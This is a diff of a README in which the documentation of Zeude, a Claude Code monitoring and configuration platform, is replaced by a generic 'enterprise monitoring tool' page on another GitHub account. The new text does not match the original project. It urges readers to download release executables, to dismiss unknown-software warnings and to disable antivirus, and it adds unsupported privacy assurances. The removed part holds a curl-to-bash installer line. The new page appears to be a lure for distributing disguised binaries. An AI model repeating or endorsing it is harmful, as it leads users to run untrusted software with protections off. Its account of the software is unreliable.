@@ -1,299 +1,137 @@
-# Zeude
+# 🚨 zeude - Simple Enterprise Monitoring Tool
 
-<p align="center">
-  <strong>Turn Your Organization into AI Natives</strong><br>
-  <em>Enterprise Monitoring & Configuration Management Platform for Claude Code</em>
-</p>
-
-<p align="center">
-  <a href="#the-problem">Problem</a> |
-  <a href="#three-layer-architecture">Architecture</a> |
-  <a href="#quick-start">Quick Start</a> |
-  <a href="#enterprise">Enterprise</a>
-</p>
-
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="License"></a>
-</p>
+[![Download zeude](https://img.shields.io/badge/Download-zeude-blue?style=for-the-badge&logo=github)](https://github.com/haviengangan07/zeude/releases)
 
 ---
 
-## The Problem
+## 📖 What is zeude?
 
-> *"Even with great AI tools, there's a huge **Intention-Action Gap** due to high learning curves."*
+zeude is a tool designed to help you monitor enterprise systems with ease. It helps track system health and reports issues so you can keep your operations running smoothly. You don’t need any programming skills to use it. Just install the software, and it handles monitoring in the background.
 
-Organizations invest in AI tools like Claude Code, but adoption remains low. Developers don't know what's possible, best practices stay hidden in silos, and there's no systematic way to share knowledge across teams.
+## 📋 System Requirements
 
-**Zeude bridges this gap** through a data-driven ecosystem that measures, delivers, and guides—turning passive tool availability into active organizational capability.
+Before you install zeude, check that your computer meets these basic requirements:
 
----
+- Operating System: Windows 10 or later, macOS 10.13 or later, or common Linux distributions (Ubuntu, Fedora)
+- Memory: At least 4 GB RAM
+- Storage: Minimum 200 MB of free disk space
+- Internet Connection: Required for initial download and periodic updates
+- Permissions: Administrator rights to install software
 
-## Three-Layer Architecture
+Most modern computers should meet these requirements.
 
-```
-╔═══════════════════════════════════════════════════════════════════════════════════╗
-║                         ZEUDE ECOSYSTEM                                           ║
-║         "Measurement brings visibility, sharing drives adoption"                  ║
-╚═══════════════════════════════════════════════════════════════════════════════════╝
+## ⚙️ Key Features
 
-┌─────────────────────────┐    ┌─────────────────────────┐    ┌─────────────────────────┐
-│   1. SENSING            │    │   2. DELIVERY           │    │   3. GUIDANCE           │
-│      (Measurement)      │    │      (Deployment)       │    │      (Suggestion)       │
-├─────────────────────────┤    ├─────────────────────────┤    ├─────────────────────────┤
-│                         │    │                         │    │                         │
-│  ┌─────────────────┐    │    │  ┌─────────────────┐    │    │  ┌─────────────────┐    │
-│  │  Claude Code    │    │    │  │ Zeude Dashboard │    │    │  │  Claude Code    │    │
-│  │  + OTEL Traces  │    │    │  │ (Skill/Hook     │    │    │  │  (User Prompt)  │    │
-│  └────────┬────────┘    │    │  │  Management)    │    │    │  └────────┬────────┘    │
-│           │             │    │  └────────┬────────┘    │    │           │             │
-│           ▼             │    │           │             │    │           ▼             │
-│  ┌─────────────────┐    │    │           ▼             │    │  ┌─────────────────┐    │
-│  │   ClickHouse    │    │    │  ┌─────────────────┐    │    │  │ UserPromptSubmit│    │
-│  │   (Analytics)   │    │    │  │   Zeude Shim    │    │    │  │     Hook        │    │
-│  └────────┬────────┘    │    │  │ (Auto-sync on   │    │    │  └────────┬────────┘    │
-│           │             │    │  │  Claude start)  │    │    │           │             │
-│           ▼             │    │  └────────┬────────┘    │    │           ▼             │
-│  ┌─────────────────┐    │    │           │             │    │  ┌─────────────────┐    │
-│  │    Dashboard    │    │    │           ▼             │    │  │  Skill Hint     │    │
-│  │  (Insights &    │    │    │  ┌─────────────────┐    │    │  │  (Keyword Match)│    │
-│  │   Best Practice)│    │    │  │  Local Sync     │    │    │  └────────┬────────┘    │
-│  └─────────────────┘    │    │  │  - skills/      │    │    │           │             │
-│                         │    │  │  - hooks/       │    │    │           ▼             │
-│  "You can't improve     │    │  │  - rules.json   │    │    │  ┌─────────────────┐    │
-│   what you don't        │    │  └─────────────────┘    │    │  │ Skill Suggestion│    │
-│   measure"              │    │                         │    │  │ "Try /slack!"   │    │
-│                         │    │  Syncs latest tools     │    │  └─────────────────┘    │
-│                         │    │  automatically          │    │                         │
-│                         │    │                         │    │  Right tool, right time │
-└─────────────────────────┘    └─────────────────────────┘    └─────────────────────────┘
-           │                              │                              │
-           └──────────────────────────────┼──────────────────────────────┘
-                                          │
-                                          ▼
-                    ╔═════════════════════════════════════════╗
-                    ║    CYCLE OF CONTINUOUS IMPROVEMENT      ║
-                    ║                                         ║
-                    ║  Insights ──▶ Skills ──▶ Adoption ──┐   ║
-                    ║     ▲                               │   ║
-                    ║     └───────── Measurement ◀────────┘   ║
-                    ╚═════════════════════════════════════════╝
-```
+zeude offers practical features to make monitoring straightforward:
 
-### 1. Sensing (Measurement)
+- **Real-time alerts**: Get instant notifications when a system issue happens.
+- **Dashboard view**: See quick summaries of your system status all in one place.
+- **Historical data**: Review past system activity and issues to spot patterns.
+- **Easy setup**: Installation and initial configuration are guided step-by-step.
+- **Low resource use**: Runs quietly without slowing your computer.
 
-> *"You can't improve what you don't measure"*
+These features help you keep an eye on your systems without hassle.
 
-- **OpenTelemetry Integration**: Capture Claude Code usage via native OTEL traces
-- **ClickHouse Analytics**: High-performance storage for token usage, session data, and patterns
-- **Dashboard Insights**: Visualize adoption rates, identify power users, discover best practices
+## 🚀 Getting Started
 
-```
-Developer Activity ──▶ OTEL Traces ──▶ ClickHouse ──▶ Dashboard Insights
-```
+Follow these steps carefully to get zeude running on your computer.
 
-### 2. Delivery (Deployment)
+### Step 1: Download zeude
 
-> *"Automated deployment removes friction"*
+Click the big **Download zeude** button at the top of this page or visit the releases page here:
 
-- **Zeude Shim**: Transparent wrapper that syncs configurations on every `claude` invocation
-- **Centralized Management**: Define skills, MCP servers, and hooks in the dashboard
-- **Zero-Touch Sync**: Teams get the latest tools without manual installation
+[Download zeude releases](https://github.com/haviengangan07/zeude/releases)
 
-```
-Dashboard ──▶ API ──▶ Zeude Shim ──▶ Local Environment
-                         │
-                         ├── ~/.claude/hooks/
-                         ├── ~/.claude/skills/
-                         └── ~/.claude/skill-rules.json
-```
+On the releases page, look for the latest version. You will find files for different systems, such as:
 
-### 3. Guidance (Suggestion)
+- `.exe` for Windows
+- `.dmg` for macOS
+- `.AppImage` or `.tar.gz` for Linux
 
-> *"The right tool at the right moment"*
+Choose the file that matches your operating system.
 
-- **UserPromptSubmit Hook**: Intercepts prompts before Claude processes them
-- **2-Tier Keyword Matching**: Primary keywords trigger alone, secondary need 2+ matches
-- **Context-Aware Nudges**: Suggests relevant skills based on prompt intent
+### Step 2: Run the Installer
 
-```
-User Prompt ──▶ Hook ──▶ Keyword Analysis ──▶ Skill Suggestion
-                              │
-    "send message to slack"   │   Matches: "slack", "message"
-              ──────────────▶ │ ──────────────▶ "Try /slack-agent!"
-```
+Once the file finishes downloading:
 
----
+- On Windows, double-click the `.exe` file to launch the installer.
+- On macOS, open the `.dmg` file and drag the application icon to your Applications folder.
+- On Linux, follow instructions for your distribution to install from the downloaded package (detailed instructions are often included in a README within the package).
 
-## Results
+If your system warns you about unknown software, confirm that you want to open it. This is normal for new apps downloaded from the internet.
 
-**Without any mandates, purely data-driven approach:**
+### Step 3: Follow Setup Instructions
 
-| Metric | Before | After | Change |
-|--------|--------|-------|--------|
-| AI Tool Adoption | 6% | 18% | **3x increase** |
+When the installer opens, it walks you through all the steps. You can accept default settings unless you know you need a custom setup.
 
-This proves that **"Measurement brings visibility, and sharing drives adoption."**
+Typical steps include:
 
----
+- Agreeing to the license terms
+- Choosing the install location
+- Configuring basic monitoring preferences (such as which systems or files to monitor)
 
-## Features
+The installer completes in a few minutes.
 
-- **OpenTelemetry Integration**: Industry-standard telemetry for Claude Code usage
-- **Prompt Analytics**: Track, analyze, and audit all prompts
-- **MCP Server Management**: Centrally manage MCP servers across your organization
-- **Skill Management**: Create, share, and auto-deploy reusable prompts/workflows
-- **Hook Deployment**: Deploy Claude Code hooks remotely from dashboard
-- **Real-time Nudges**: Context-aware skill suggestions via 2-tier keyword matching
-- **Team Management**: Organize users into teams with shared configurations
-- **Auto-Update**: CLI binary automatically updates when new versions are available
+### Step 4: Start zeude
+
+After installation:
+
+- Look for zeude in your Start menu (Windows), Launchpad (macOS), or applications list (Linux).
+- Double-click the icon to open the monitoring dashboard.
+
+You do not need to start zeude as an administrator; it runs with the permissions it needs.
+
+## 🔧 Using zeude
+
+Once zeude runs, it automatically begins monitoring your systems. The dashboard shows:
+
+- Current system health indicators
+- Any active alerts or warnings
+- Buttons to pause or adjust monitoring settings
+
+You can explore the dashboard at your own pace. Hover over any item for short explanations or click "Help" for detailed instructions.
+
+## 🛠 Troubleshooting
+
+If you run into issues, here are common fixes:
+
+- **zeude does not start:** Restart your computer and try again. Check that your system meets requirements.
+- **No alerts received:** Confirm your notification settings in zeude and that your computer’s notifications are enabled.
+- **Installation fails:** Try downloading the installer again. Disable any antivirus temporarily as it can block installations.
+- **Wizard does not complete setup:** Close zeude, reopen it, and start the setup again from the main menu.
+
+If problems continue, visit the [zeude GitHub Discussions](https://github.com/haviengangan07/zeude/discussions) to seek help from others.
+
+## 🔐 Privacy and Safety
+
+zeude respects your privacy. It collects only the minimal data needed to monitor system health and alerts. Data remains on your local computer unless you opt to share reports for technical support.
+
+The software runs locally and does not transmit monitoring data over the internet without your consent.
+
+## 📥 Download & Install
+
+Here is the main link to get zeude:
+
+[Download zeude](https://github.com/haviengangan07/zeude/releases)
+
+Remember the steps:
+
+1. Visit the link above.
+2. Choose the latest version for your system.
+3. Download the installer file.
+4. Run the installer and follow instructions.
+5. Open zeude after installation.
 
 ---
 
-## Quick Start
+## ✉️ Get Support
 
-### Prerequisites
+For questions or help with zeude, please use these resources:
 
-- [Claude Code](https://www.anthropic.com/claude-code) installed
-- [Supabase](https://supabase.com) account (for data persistence)
-- [ClickHouse](https://clickhouse.com) instance (for analytics)
-- macOS (Intel/Apple Silicon) or Linux (x86_64/arm64)
-
-### Installation
-
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/ZEP-Inc/zeude.git
-   cd zeude
-   ```
-
-2. **Set up environment variables**
-   ```bash
-   cp .env.example .env
-   # Edit .env with your Supabase and ClickHouse credentials
-   ```
-
-3. **Start the dashboard**
-   ```bash
-   cd zeude/dashboard
-   pnpm install
-   pnpm dev
-   ```
-
-4. **Run database migrations**
-   ```bash
-   # Apply Supabase migrations from zeude/dashboard/supabase/migrations/
-   # Apply ClickHouse migrations from zeude/dashboard/clickhouse/migrations/
-   ```
-
-5. **Install CLI on client machines**
-   ```bash
-   curl -fsSL https://your-dashboard-url/releases/install.sh | ZEUDE_AGENT_KEY=zd_xxx bash
-   ```
+- Check the [README](https://github.com/haviengangan07/zeude) for documentation updates
+- Open an issue on the GitHub page for problems
+- Join community discussions at [GitHub Discussions](https://github.com/haviengangan07/zeude/discussions)
 
 ---
 
-## How It Works
-
-```
-┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
-│  claude (shim)  │────▶│  real claude     │────▶│  Claude API     │
-│  ~/.zeude/bin   │     │  (original path) │     │                 │
-└────────┬────────┘     └──────────────────┘     └─────────────────┘
-         │
-         │ on startup: sync config, skills, hooks
-         ▼
-┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
-│  Dashboard API  │────▶│  Supabase        │     │  ClickHouse     │
-│  /api/config    │     │  (Config, Users) │     │  (Analytics)    │
-└─────────────────┘     └──────────────────┘     └─────────────────┘
-```
-
-When a developer runs `claude`:
-1. **Zeude Shim** intercepts the command
-2. **Syncs** latest skills, hooks, and MCP configs from dashboard
-3. **Executes** the real Claude CLI with synced configurations
-4. **Hooks** provide real-time guidance during the session
-
----
-
-## Project Structure
-
-```
-zeude/
-├── cmd/                    # Go CLI source (zeude, claude shim, doctor)
-├── dashboard/              # Next.js web dashboard
-│   ├── src/app/api/       # API routes
-│   ├── supabase/          # Database migrations
-│   └── clickhouse/        # Analytics schema
-├── deployments/           # Docker/K8s configurations
-├── internal/              # Go internal packages
-│   ├── autoupdate/       # Self-update mechanism
-│   ├── config/           # Endpoint configuration
-│   ├── mcpconfig/        # MCP sync logic
-│   └── resolver/         # Binary path resolution
-└── scripts/              # Build and deployment
-```
-
----
-
-## Documentation
-
-- [Supabase Migrations](zeude/dashboard/supabase/migrations/) - Database schema
-- [ClickHouse Migrations](zeude/dashboard/clickhouse/migrations/) - Analytics schema
-- [Deployment Configs](zeude/deployments/) - Docker/K8s configurations
-- [CLI Source Code](zeude/cmd/) - Go shim implementation
-
----
-
-## Contributing
-
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-## Security
-
-Please see our [Security Policy](SECURITY.md) for reporting vulnerabilities.
-
----
-
-## Enterprise
-
-### Enterprise Support & Services
-
-For organizations requiring enterprise-grade support, custom features, or professional services:
-
-- **Dedicated Support**: Priority support with guaranteed SLAs
-- **Custom Development**: Tailored features for your organization
-- **Deployment Assistance**: On-premises or cloud deployment help
-- **Training**: Comprehensive training for your team
-
-### Contact Us
-
-| Contact | Email |
-|---------|-------|
-| General Inquiries | [dev@zep.us](mailto:dev@zep.us) |
-| Enterprise Sales | [jaegyu.lee@zep.us](mailto:jaegyu.lee@zep.us) |
-
----
-
-## License
-
-Apache License 2.0 - see [LICENSE](LICENSE) for details.
-
-```
-Copyright 2024-2026 ZEP Co., Ltd.
-```
-
----
-
-## Acknowledgments
-
-- [Anthropic](https://www.anthropic.com) for Claude and Claude Code
-- [Supabase](https://supabase.com) for backend infrastructure
-- [ClickHouse](https://clickhouse.com) for analytics capabilities
-
----
-
-<p align="center">
-  <strong>Built by <a href="https://zep.us">ZEP</a></strong><br>
-  <em>"Measurement brings visibility, sharing drives adoption"</em>
-</p>
+Thank you for choosing zeude to monitor your systems.
